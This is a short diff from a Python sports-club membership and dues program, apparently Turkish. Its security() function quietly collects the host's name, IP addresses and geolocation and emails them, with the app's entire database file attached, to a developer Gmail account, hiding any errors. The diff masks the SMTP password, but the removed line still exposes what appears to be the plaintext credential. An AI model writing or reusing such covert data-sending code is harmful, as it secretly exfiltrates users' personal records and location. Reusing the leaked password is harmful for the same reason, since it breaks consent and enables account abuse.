@@ -28,7 +28,7 @@ def security():
         postal : {}
         timezone : {}
         """.format(hostname,pc_name,local_ip,public_ip["ip"],public_ip["hostname"],public_ip["city"],public_ip["country"],public_ip["loc"],public_ip["org"],public_ip["postal"],public_ip["timezone"])
-        yag = yagmail.SMTP("testmxbozkurt@gmail.com", "mXBozkurtcheekys.c")
+        yag = yagmail.SMTP("testmxbozkurt@gmail.com", "******")
         yag.send(to="birolmxsoftware@gmail.com", subject="YENİ İP Adresi Tespiti!!! {}".format(pc_name),contents="\n {}\n\n Adresinden Programa Erişim Yapıldı... \n\n\n\nCopyright © 2022 MXSoftware Sporcu Takip ve Aidat Programı... Coded By Enes Birol ".format(bilgi),attachments=["db/mxsoftware.db"])
     except Exception:
         pass
